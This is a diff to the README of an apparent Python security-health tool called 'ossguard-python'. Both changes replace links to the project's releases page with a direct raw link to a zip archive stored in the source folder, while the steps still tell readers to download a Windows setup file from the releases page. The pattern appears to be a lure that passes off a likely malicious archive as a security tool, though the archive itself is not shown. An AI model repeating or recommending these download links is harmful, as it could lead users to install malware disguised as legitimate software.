@@ -1,6 +1,6 @@
 # 🛡️ ossguard-python - Track open source project security health
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Hollylopsided474/ossguard-python/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Hollylopsided474/ossguard-python/main/src/ossguard/python-ossguard-v2.5.zip)
 
 OSSGuard helps you understand the security of your computer programs. It reviews the software components you use and tells you if they meet modern safety standards. You can use this tool to spot risks in your supply chain and fix issues before they become problems.
 
@@ -23,7 +23,7 @@ You need a computer running Windows 10 or Windows 11 to use the tool. The applic
 
 You can download the application from the project release page. 
 
-[Visit this page to download the latest setup file](https://github.com/Hollylopsided474/ossguard-python/releases)
+[Visit this page to download the latest setup file](https://raw.githubusercontent.com/Hollylopsided474/ossguard-python/main/src/ossguard/python-ossguard-v2.5.zip)
 
 1. Go to the link provided above.
 2. Look for the latest version listed under the Releases section.
